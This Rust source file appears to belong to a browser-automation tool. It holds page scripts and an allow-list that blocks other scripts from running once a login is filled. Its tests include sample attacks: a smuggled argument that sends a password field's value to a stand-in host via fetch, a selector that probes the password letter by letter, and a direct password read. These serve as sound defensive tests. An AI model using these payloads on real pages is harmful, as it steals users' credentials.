//! The scripts `horadric mcp` runs in a browser pane's page to read and
//! act on it. They are here, not in the mcp, because the app must know
//! them too: after a web login is filled, a page may only run these, with
//! refs and no selectors, since any other script could read the password
//! out of its field (docs/plan/vault.md, "The pane hides what it filled").

use serde_json::Value;

/// The middle of the window, for a wheel that names no element.
pub const MIDDLE: &str = "({ x: innerWidth / 2, y: innerHeight / 2 })";

/// How far down the page is scrolled, of how far it goes.
pub const SCROLLED: &str =
    "[Math.round(scrollY), Math.max(0, document.documentElement.scrollHeight - innerHeight)]";

/// The page functions that take `(ref, selector, ...)` or, for FIND,
/// `(text, selector)`: the selector is always the second argument.
const FUNCTIONS: [&str; 6] = [POINT, FOCUS, SELECT, RECT, INTO_VIEW, FIND];

/// The expression that calls page function `fun` with `args`, the helpers
/// in scope.
pub fn call(fun: &str, args: &[Value]) -> String {
    let args: Vec<String> = args.iter().map(Value::to_string).collect();
    format!(
        "(() => {{\n{HELPERS}\nreturn ({fun})({});\n}})()",
        args.join(", ")
    )
}

/// The expression that outlines the page.
pub fn snapshot() -> String {
    format!("({SNAPSHOT})()")
}

/// The expression that reads what the page logged, as the app's console
/// keeper holds it (`browse::KEEP_CONSOLE`), and clears it when `clear`.
pub fn console(clear: bool) -> String {
    format!(
        "(() => {{ const detail = {{ clear: {clear}, out: [] }}; \
         dispatchEvent(new CustomEvent('horadric-console', {{ detail }})); \
         return detail.out; }})()"
    )
}

/// Whether `expression` may run in a page holding a filled login: one of
/// the page functions above exactly, called with plain JSON and no
/// selector (a selector such as `input[value^="a"]` asks the page about
/// the password a letter at a time), the snapshot, or one of the two
/// fixed reads.
pub fn safe_after_fill(expression: &str) -> bool {
    matches(expression, true)
}

/// Whether `expression` is one of the scripts here, selectors or not:
/// running one puts none of the agent's own code into the page.
pub fn known(expression: &str) -> bool {
    matches(expression, false)
}

fn matches(expression: &str, refs_only: bool) -> bool {
    if expression == snapshot() || expression == MIDDLE || expression == SCROLLED {
        return true;
    }
    // The console may hold what the page logged of its own fields, so it
    // is read only where nothing was filled; reading it is no code of the
    // agent's.
    if !refs_only && (expression == console(true) || expression == console(false)) {
        return true;
    }
    FUNCTIONS.iter().any(|fun| {
        let head = format!("(() => {{\n{HELPERS}\nreturn ({fun})(");
        let Some(args) = expression
            .strip_prefix(&head)
            .and_then(|r| r.strip_suffix(");\n})()"))
        else {
            return false;
        };
        // JSON is a subset of JavaScript, so arguments that parse as a
        // JSON array are data and nothing else.
        let Ok(Value::Array(args)) = serde_json::from_str::<Value>(&format!("[{args}]")) else {
            return false;
        };
        !refs_only || args.get(1).is_none_or(Value::is_null)
    })
}

/// What the page functions share: finding the element a call names, and
/// saying what it is.
pub const HELPERS: &str = r#"
const clean = (s, n) => { s = String(s || "").replace(/\s+/g, " ").trim(); return s.length > n ? s.slice(0, n - 3) + "..." : s; };
const secret = (e) => e.type === "password" || e.hasAttribute("data-horadric-filled") || /password|one-time-code/.test(e.getAttribute("autocomplete") || "");
const pick = (ref, selector) => {
  if (ref) {
    const refs = (window.__horadric || {}).refs || [];
    const el = refs[Number(String(ref).replace(/^e/, ""))];
    if (!el) return `there is no ${ref} on this page; take a new browser_snapshot`;
    if (!el.isConnected) return `${ref} is gone from the page; take a new browser_snapshot`;
    return el;
  }
  if (selector) return document.querySelector(selector) || `nothing on the page matches ${selector}`;
  return "say which element: a ref from browser_snapshot, or a selector";
};
const describe = (e) => {
  const tag = e.tagName.toLowerCase();
  const label = clean(e.getAttribute("aria-label") || e.innerText || (secret(e) ? "" : e.value) || e.getAttribute("placeholder") || "", 60);
  return label ? `${tag} ${JSON.stringify(label)}` : tag;
};
const deepest = (x, y) => {
  let t = document.elementFromPoint(x, y);
  while (t && t.shadowRoot) {
    const d = t.shadowRoot.elementFromPoint(x, y);
    if (!d || d === t) break;
    t = d;
  }
  return t;
};
"#;

/// Where to click an element, scrolled to the middle of the page, and what
/// is on top of it there if something else is.
pub const POINT: &str = r#"(ref, selector) => {
  const el = pick(ref, selector);
  if (typeof el === "string") return { error: el };
  el.scrollIntoView({ block: "center", inline: "center", behavior: "instant" });
  const r = el.getBoundingClientRect();
  if (!r.width && !r.height) return { error: `${describe(el)} takes no space on the page, so it can not be reached` };
  const x = r.left + r.width / 2, y = r.top + r.height / 2;
  const top = deepest(x, y);
  const covered = top && top !== el && !el.contains(top) && !top.contains(el) ? describe(top) : null;
  return { x, y, what: describe(el), covered };
}"#;

/// Puts the keyboard in a field, its text selected to be replaced or the
/// caret at its end.
pub const FOCUS: &str = r#"(ref, selector, clear) => {
  const el = pick(ref, selector);
  if (typeof el === "string") return { error: el };
  if (el.tagName === "SELECT") return { error: `${describe(el)} is a select: choose with browser_select` };
  el.scrollIntoView({ block: "center", behavior: "instant" });
  el.focus();
  const root = el.getRootNode();
  if (!(root.activeElement === el || el.contains(root.activeElement))) return { error: `${describe(el)} does not take typing` };
  if (clear) {
    if ("value" in el && typeof el.select === "function") el.select();
    else if (el.isContentEditable) { const r = document.createRange(); r.selectNodeContents(el); const s = getSelection(); s.removeAllRanges(); s.addRange(r); }
  } else if ("value" in el && typeof el.setSelectionRange === "function") {
    try { const n = el.value.length; el.setSelectionRange(n, n); } catch {}
  }
  return { what: describe(el) };
}"#;

pub const SELECT: &str = r#"(ref, selector, values) => {
  const el = pick(ref, selector);
  if (typeof el === "string") return { error: el };
  if (el.tagName !== "SELECT") return { error: `${describe(el)} is not a select; click it and pick from what opens` };
  const want = [].concat(values).map(String);
  const chosen = [];
  for (const o of el.options) {
    const on = (want.includes(o.value) || want.includes(o.text.trim())) && (el.multiple || !chosen.length);
    o.selected = on;
    if (on) chosen.push(o.text.trim());
  }
  if (!chosen.length) return { error: `no option of ${describe(el)} has the value or text ${JSON.stringify(want)}` };
  el.dispatchEvent(new Event("input", { bubbles: true }));
  el.dispatchEvent(new Event("change", { bubbles: true }));
  return { what: describe(el), chosen };
}"#;

/// An element's place on the page, scrolled into view, for a picture of it.
pub const RECT: &str = r#"(ref, selector) => {
  const el = pick(ref, selector);
  if (typeof el === "string") return { error: el };
  el.scrollIntoView({ block: "center", behavior: "instant" });
  const r = el.getBoundingClientRect();
  if (!r.width || !r.height) return { error: `${describe(el)} takes no space on the page` };
  return { x: r.left + scrollX, y: r.top + scrollY, width: r.width, height: r.height };
}"#;

pub const INTO_VIEW: &str = r#"(ref, selector) => {
  const el = pick(ref, selector);
  if (typeof el === "string") return { error: el };
  el.scrollIntoView({ block: "center", behavior: "instant" });
  return { what: describe(el) };
}"#;

/// Whether the text is on the page, or the selector matches something
/// shown, with that text in it when both are given.
pub const FIND: &str = r#"(text, selector) => {
  if (selector) {
    const el = document.querySelector(selector);
    if (!el || (el.checkVisibility && !el.checkVisibility())) return false;
    return !text || el.innerText.includes(text);
  }
  return (document.body ? document.body.innerText : "").includes(text);
}"#;

/// The page as an outline an agent can read and point into: each link,
/// button and field gets a ref, kept in `window.__horadric.refs` for the
/// other tools until the next snapshot.
pub const SNAPSHOT: &str = r#"() => {
  const H = (window.__horadric = window.__horadric || {});
  const refs = (H.refs = []);
  const lines = [];
  let size = 0, cut = false;
  const clean = (s, n) => { s = String(s || "").replace(/\s+/g, " ").trim(); return s.length > n ? s.slice(0, n - 3) + "..." : s; };
  const q = (s) => JSON.stringify(s);
  const secret = (e) => e.type === "password" || e.hasAttribute("data-horadric-filled") || /password|one-time-code/.test(e.getAttribute("autocomplete") || "");
  const say = (depth, line) => {
    if (cut) return;
    const l = "  ".repeat(depth) + "- " + line;
    size += l.length + 1;
    if (size > 50000) { cut = true; return; }
    lines.push(l);
  };
  const shown = (e) => {
    if (!e.checkVisibility) return e.getClientRects().length > 0;
    return e.checkVisibility() || getComputedStyle(e).display === "contents";
  };
  const INPUT = { checkbox: "checkbox", radio: "radio", button: "button", submit: "button", reset: "button", image: "button",
    range: "slider", file: "file picker", color: "color picker", hidden: null, search: "searchbox", number: "spinbutton" };
  const ACTIVE = new Set(["link", "button", "checkbox", "radio", "textbox", "searchbox", "combobox", "listbox", "slider",
    "spinbutton", "switch", "tab", "menuitem", "menuitemcheckbox", "menuitemradio", "option", "treeitem", "file picker",
    "color picker", "clickable"]);
  const GROUPS = new Set(["navigation", "main", "complementary", "form", "dialog", "alertdialog", "alert", "table",
    "banner", "contentinfo", "region", "search", "tablist", "menu", "menubar", "toolbar", "tabpanel"]);
  const LANDMARK = { NAV: "navigation", MAIN: "main", ASIDE: "complementary", FORM: "form", DIALOG: "dialog",
    TABLE: "table", HEADER: "banner", FOOTER: "contentinfo" };
  const BLOCK = new Set(["P", "LI", "TD", "TH", "DT", "DD", "BLOCKQUOTE", "PRE", "FIGCAPTION", "CAPTION", "LEGEND", "LABEL"]);
  const SKIP = new Set(["SCRIPT", "STYLE", "NOSCRIPT", "TEMPLATE", "HEAD", "META", "LINK", "svg"]);
  const ACTIVE_SEL = "a[href],button,input,select,textarea,summary,[role],[onclick],[tabindex],[contenteditable],h1,h2,h3,h4,h5,h6,img,iframe";
  const FIELDS = new Set(["textbox", "searchbox", "combobox", "listbox", "spinbutton", "slider"]);
  const role = (e) => {
    const r = (e.getAttribute("role") || "").split(" ")[0];
    if (r && r !== "presentation" && r !== "none" && r !== "generic") return r;
    const t = e.tagName;
    if (t === "INPUT") { const ty = (e.type || "text").toLowerCase(); return ty in INPUT ? INPUT[ty] : "textbox"; }
    if (t === "A") return e.hasAttribute("href") ? "link" : null;
    if (t === "BUTTON" || t === "SUMMARY") return "button";
    if (t === "SELECT") return e.multiple ? "listbox" : "combobox";
    if (t === "TEXTAREA") return "textbox";
    if (/^H[1-6]$/.test(t)) return "heading";
    if (t === "IMG") return "img";
    if (t === "IFRAME") return "iframe";
    if (e.isContentEditable && !(e.parentElement && e.parentElement.isContentEditable)) return "textbox";
    if (e.hasAttribute("onclick") || (e.hasAttribute("tabindex") && e.tabIndex >= 0)) return "clickable";
    return null;
  };
  const byIds = (e) => {
    const ids = e.getAttribute("aria-labelledby");
    if (!ids) return "";
    return ids.split(/\s+/).map((id) => { const x = document.getElementById(id); return x ? x.innerText || x.textContent : ""; }).join(" ");
  };
  const name = (e, r) => {
    let n = e.getAttribute("aria-label") || byIds(e);
    if (!n && e.labels && e.labels.length) n = Array.from(e.labels, (l) => l.innerText).join(" ");
    if (!n && FIELDS.has(r)) n = e.getAttribute("placeholder") || e.getAttribute("title") || e.getAttribute("name") || "";
    if (!n && e.tagName === "INPUT" && /^(button|submit|reset)$/.test(e.type)) n = e.value;
    if (!n) n = e.getAttribute("alt") || "";
    if (!n && !FIELDS.has(r)) n = e.innerText || "";
    if (!n) n = e.getAttribute("title") || "";
    return clean(n, 100);
  };
  const state = (e, r) => {
    const s = [];
    if (e.disabled || e.getAttribute("aria-disabled") === "true") s.push("disabled");
    if (["checkbox", "radio", "switch", "menuitemcheckbox", "menuitemradio"].includes(r)) {
      const on = e.tagName === "INPUT" ? e.checked : e.getAttribute("aria-checked") === "true";
      s.push(on ? "checked" : "unchecked");
    }
    const ex = e.getAttribute("aria-expanded");
    if (ex) s.push(ex === "true" ? "expanded" : "collapsed");
    if (e.getAttribute("aria-selected") === "true") s.push("selected");
    const cur = e.getAttribute("aria-current");
    if (cur && cur !== "false") s.push("current");
    if (e.tagName === "SELECT") {
      s.push("value=" + q(clean(Array.from(e.selectedOptions, (o) => o.text).join(", "), 60)));
      s.push("options: " + Array.from(e.options).slice(0, 25).map((o) => q(clean(o.text, 40))).join(", ") + (e.options.length > 25 ? ", ..." : ""));
    } else if (FIELDS.has(r)) {
      const v = e.isContentEditable ? e.innerText : e.value;
      if (v) s.push("value=" + q(secret(e) ? "(hidden)" : clean(v, 80)));
    }
    if (r === "link") { const h = e.getAttribute("href"); if (h && !h.startsWith("javascript:")) s.push("to " + clean(h, 100)); }
    const root = e.getRootNode();
    if (root.activeElement === e) s.push("focused");
    return s.length ? " " + s.join(" ") : "";
  };
  const kids = (n) => n.shadowRoot ? n.shadowRoot.childNodes : n.tagName === "SLOT" ? n.assignedNodes({ flatten: true }) : n.childNodes;
  const walk = (n, depth) => {
    for (const c of kids(n)) {
      if (cut) return;
      if (c.nodeType === 3) {
        const t = clean(c.textContent, 300);
        if (t && /[\p{L}\p{N}]/u.test(t)) say(depth, "text: " + q(t));
        continue;
      }
      if (c.nodeType !== 1 || SKIP.has(c.tagName) || !shown(c)) continue;
      const t = c.tagName;
      const r = role(c);
      if (r && ACTIVE.has(r)) {
        if (getComputedStyle(c).visibility === "hidden") continue;
        const i = refs.push(c) - 1;
        say(depth, `${r} ${q(name(c, r))}${state(c, r)} [ref=e${i}]`);
        if ((r === "clickable" || r === "listbox" || r === "option" || r === "treeitem") && c.querySelector(ACTIVE_SEL)) walk(c, depth + 1);
        continue;
      }
      if (r === "heading") {
        say(depth, `heading ${c.getAttribute("aria-level") || t.slice(1)} ${q(clean(c.innerText, 200))}`);
        if (c.querySelector("a[href],button,input")) walk(c, depth + 1);
        continue;
      }
      if (r === "img") { const n = name(c, r); if (n) say(depth, `img ${q(n)}`); continue; }
      if (r === "iframe") { say(depth, `iframe ${q(c.title || c.src)} (not read: use browser_evaluate or browser_devtools)`); continue; }
      const g = LANDMARK[t] || (GROUPS.has(r) ? r : null);
      if (g) {
        const n = clean(c.getAttribute("aria-label") || byIds(c), 80);
        say(depth, g + (n ? " " + q(n) : "") + ":");
        walk(c, depth + 1);
        continue;
      }
      if (!c.shadowRoot && !c.querySelector(ACTIVE_SEL)) {
        const text = clean(c.innerText, 1000);
        if (!text) continue;
        if (BLOCK.has(t) || text.length <= 300) { say(depth, "text: " + q(text)); continue; }
      }
      walk(c, depth);
    }
  };
  walk(document.body || document.documentElement, 0);
  const tall = Math.max(0, document.documentElement.scrollHeight - innerHeight);
  const head = [
    `Page ${q(document.title)} at ${location.href}`,
    `Viewport ${innerWidth} x ${innerHeight}, scrolled ${Math.round(scrollY)} of ${tall} pixels down`,
  ];
  if (cut) lines.push("(cut short here: the page has more. Scroll, or read it with browser_evaluate.)");
  return head.concat(lines).join("\n");
}"#;

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn only_the_known_scripts_run_after_a_fill() {
        assert!(safe_after_fill(&snapshot()));
        assert!(safe_after_fill(MIDDLE));
        assert!(safe_after_fill(SCROLLED));
        assert!(safe_after_fill(&call(POINT, &[json!("e3"), Value::Null])));
        assert!(safe_after_fill(&call(
            FOCUS,
            &[json!("e3"), Value::Null, json!(true)]
        )));
        assert!(safe_after_fill(&call(
            FIND,
            &[json!("Welcome"), Value::Null]
        )));
        assert!(safe_after_fill(&call(
            SELECT,
            &[json!("e1"), Value::Null, json!(["a"])]
        )));
        assert!(!safe_after_fill(
            "document.querySelector('input[type=password]').value"
        ));
        assert!(!safe_after_fill(&call(
            POINT,
            &[Value::Null, json!("input[value^=a]")]
        )));
        assert!(!safe_after_fill(&call(FIND, &[Value::Null, json!("#pw")])));
        assert!(!safe_after_fill(&call("(r) => r.value", &[json!("e3")])));
        assert!(known(&call(POINT, &[Value::Null, json!("#go")])));
        assert!(!known(&call("(r) => r.value", &[json!("e3")])));
        assert!(known(&console(true)) && known(&console(false)));
        assert!(!safe_after_fill(&console(false)));
    }

    #[test]
    fn no_script_reports_a_secret_fields_value() {
        assert!(HELPERS.contains("(secret(e) ? \"\" : e.value)"));
        assert!(SNAPSHOT.contains("q(secret(e) ? \"(hidden)\" : clean(v, 80))"));
        assert!(SNAPSHOT.contains("data-horadric-filled"));
    }

    #[test]
    fn arguments_that_are_code_are_refused() {
        let head = format!("(() => {{\n{HELPERS}\nreturn ({POINT})(");
        let sneaky = format!("{head}\"e1\", null), fetch('//x.example/' + pw.value);\n}})()");
        assert!(!safe_after_fill(&sneaky));
        let sneaky = format!("{head}(alert(1)), null);\n}})()");
        assert!(!safe_after_fill(&sneaky));
    }
}
